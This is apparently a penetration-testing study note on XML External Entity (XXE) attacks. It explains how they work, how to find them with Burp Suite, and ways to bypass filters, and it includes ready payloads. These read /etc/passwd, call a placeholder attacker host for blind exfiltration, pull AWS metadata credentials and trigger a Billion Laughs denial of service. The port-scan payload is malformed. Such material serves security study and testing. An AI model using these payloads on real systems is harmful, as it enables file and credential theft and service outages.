# Index
- [[Back End Vulnerabilities]]
	- [[1. Insecure File Uploads]]
	- [[2. File Inclusion]]
	- [[3. Command Injection]]
	- [[4. SQL Injection (SQLi)]]
	- [[5. Server-Side Request Forgery (SSRF)]]
	- [[6. Server-Side Template Injection (SSTi)]]
	- [[7. XML External Entity (XXE)]]
	- [[8. Insecure Deserialization]]

# XML External Entity (XXE)

XML External Entity (XXE) is a vulnerability that arises when an application processes user-supplied XML input without disabling external entity references. XML documents may include entities that reference local files or network resources, and when a vulnerable parser processes these entities, it allows attackers to access sensitive data on the server, perform remote file inclusion, or even initiate Server-Side Request Forgery (SSRF) attacks.

XXE vulnerabilities can lead to severe consequences such as reading sensitive files (e.g., configuration files, passwords), performing Denial of Service (DoS) attacks, or executing arbitrary commands by exploiting the server’s XML parser. These vulnerabilities are commonly found in web applications, web services (SOAP, REST), and APIs that rely on XML-based processing.

# How XML External Entity Works

XXE exploits the way XML parsers handle external entities defined within an XML document. Here’s a breakdown of how the vulnerability works:

1. **User-Supplied XML Input:** The application accepts XML input from users, typically through APIs, web services, or file uploads. This input is often processed by the server's XML parser.
   - Example of a typical XML input:
     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <data>
       <user>John</user>
     </data>
     ```
2. **External Entity Injection:** The attacker modifies the XML input to define an external entity. This entity references a file on the server’s filesystem or a remote resource.
   - Example of a malicious XML input:
     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE foo [ 
     <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
     <data>
       <user>&xxe;</user>
     </data>
     ```
3. **XML Parser Processes the External Entity:** The vulnerable XML parser processes the external entity (`&xxe;`) and resolves the reference. If the reference points to a file on the server, the contents of that file are included in the XML output.
4. **Attacker Retrieves Sensitive Information:** The attacker receives the server’s response, which now contains the contents of the file referenced by the external entity. This could be sensitive data like `/etc/passwd`, `/proc/self/environ`, or configuration files.
5. **Further Exploitation:** The attacker may use XXE to execute SSRF, Denial of Service (DoS) attacks, or even remote code execution (RCE) if the server allows interaction with certain network protocols (e.g., `ftp://`, `gopher://`, or `http://`).

# Types of XML External Entity Attacks

XXE vulnerabilities can be exploited in several ways, depending on the target and attack vector. The primary types of XXE attacks include:

## Basic XXE (File Disclosure)
- In a basic XXE attack, the attacker uses an external entity to read sensitive files from the server. This is the most common type of XXE attack and is used to access files like `/etc/passwd`, configuration files, or logs.

### How Basic XXE Works
1. The attacker submits an XML document that defines an external entity referencing a file.
2. The XML parser resolves the entity and returns the file contents in the response.

**Example:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>
  <user>&xxe;</user>
</data>
```

## Blind XXE (No Output)
- In blind XXE, the server does not return the contents of the file in the response, but the attacker can infer success by observing side effects, such as network interactions or timing-based delays.

### How Blind XXE Works
1. The attacker defines an external entity that triggers an out-of-band (OOB) interaction, such as an HTTP request to a server they control.
2. The attacker observes network requests or other side effects to confirm that the XXE attack was successful.

**Example:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
<!ENTITY xxe SYSTEM "http://<attacker_ip>/data"> ]>
<data>
  <user>&xxe;</user>
</data>
```

The server makes an HTTP request to the attacker-controlled domain, confirming the success of the XXE attack.

## SSRF via XXE
- An attacker can use XXE to perform Server-Side Request Forgery (SSRF) by tricking the XML parser into making requests to internal services or cloud metadata endpoints (such as AWS).

### How SSRF via XXE Works
1. The attacker submits an XML document that includes an external entity pointing to an internal or cloud-based URL.
2. The XML parser processes the request, potentially exposing internal services or cloud credentials.

**Example (Access AWS Metadata Service):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<data>
  <user>&xxe;</user>
</data>
```

## XXE with Denial of Service (Billion Laughs Attack)
- The "Billion Laughs" attack is a type of XML Denial of Service (DoS) attack. It uses recursive entity expansion to exhaust server resources and crash the system.

### How the Billion Laughs Attack Works
1. The attacker submits an XML document that contains recursively defined entities.
2. The XML parser processes these entities, leading to exponential memory consumption and crashing the server.

**Example:**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

# Manual Discovery Techniques for XXE

Here are several manual techniques to discover and exploit XXE vulnerabilities in web applications:

## 1. Analyze XML Input Points
- Review the application for features that accept XML input, such as file uploads, SOAP-based web services, or API endpoints. Identify areas where user-supplied XML may be processed without validation.

## 2. Inject External Entities
- Try injecting external entities into the XML input to see if the application processes them. Start with basic file disclosure payloads.
  
**Example:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>
  <user>&xxe;</user>
</data>
```

## 3. Use Burp Suite to Intercept and Modify Requests
- Use Burp Suite to intercept XML-based HTTP requests, modify the request to include external entities, and observe the response.

**Example Interception:**
```http
POST /api HTTP/1.1
Host: <target_domain>
Content-Type: application/xml
Content-Length: 123

<?xml version="1.0" encoding="UTF-8"?>
<data>
  <user>John</user>
</data>
```

Modify the request to include an external entity:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>
  <user>&xxe;</user>
</data>
```

## 4. Test for Blind XXE with Out-of-Band Channels
- For blind XXE, test using out-of-band (OOB) channels, such as DNS or HTTP requests. Inject an external entity that references a URL under your control, and monitor for incoming requests.

**Example:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
<!ENTITY xxe SYSTEM "http://<attacker_domain>/log"> ]>
<data>
  <user>&xxe;</user>
</data>
```

Monitor your server for incoming requests from the vulnerable system.

## 5. Test for Protocol Exploits (SSRF or File Disclosure)
- Inject payloads that use different protocols such as `ftp://`, `file://`, or `http://` to attempt SSRF or file disclosure.

**Example (SSRF):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<data>
  <user>&xxe;</user>
</data>
```

## 6. Test for Denial of Service (Billion Laughs)
- Test if the XML parser is vulnerable to recursive entity expansion by injecting a “Billion Laughs” payload.

**Example:**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
]>
<lolz>&lol2;</lolz>
```

# XXE Payloads

Here are some common XXE payloads used to exploit this vulnerability:

## Basic File Disclosure Payload
- Use this payload to read sensitive files on the server:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>
  <user>&xxe;</user>
</data>
```

## SSRF via XXE (Access Internal Services)
- Use this payload to access internal services or cloud metadata:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<data>
  <user>&xxe;</user>
</data>
```

## Blind XXE with External DNS or HTTP Requests
- Inject a payload that sends a request to an external server to confirm XXE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
<!ENTITY xxe SYSTEM "http://<attacker_domain>/log"> ]>
<data>
  <user>&xxe;</user>
</data>
```

## Port Scan XXE
- Port Scanning This payload uses the server to scan for open ports on a target system:

```
<!DOCTYPE foo [
<!ELEMENT foo SYSTEM "http://localhost:8080" >]>
<foo>&xxe1;</foo>
<!ENTITY xxe1 SYSTEM "http://localhost:8081" >]
<foo>&xxe2;</foo>
<!ENTITY xxe2 SYSTEM "http://localhost:8082" >]   ...
```

## Denial of Service (Billion Laughs Attack)
- Use the Billion Laughs payload to crash the XML parser:
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
]>
<lolz>&lol2;</lolz>
```

# Bypassing Defenses

Here are techniques to bypass common defenses in XXE attacks:

## Bypass XML Schema Validation
- Applications may use XML schemas to validate input. However, external entities may still be processed if the schema doesn't block them. Test for external entity processing even with schema validation in place.

## Use Alternate Entity Types
- Some defenses may only block `SYSTEM` entities. Try using `PUBLIC` entities to bypass simple defenses:
```xml
<!ENTITY % xxe PUBLIC "data" "file:///etc/passwd">
```

## Use Different Protocols
- Some defenses may block certain protocols like `file://`. Try using `ftp://`, `http://`, or `gopher://` to bypass filters.

## Chaining XXE with Other Vulnerabilities
- Combine XXE with other vulnerabilities like SSRF or open redirects to escalate the attack. For example, use XXE to perform SSRF and access internal services.

## Use Encoding to Bypass Filters
- Use URL encoding or Base64 encoding to bypass filters that block certain strings:
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd%00">
```

# Resources

|**Website**|**URL**|
|-|-|
|OWASP XXE|https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing|
|PortSwigger XXE|https://portswigger.net/web-security/xxe|
|HackTricks XXE Guide|https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity|
|PayloadAllTheThings (XXE)|https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE|
|Exploit Database XXE|https://www.exploit-db.com/|
|Burp Suite Guide to XXE|https://portswigger.net/burp/documentation/knowledge-base/xxe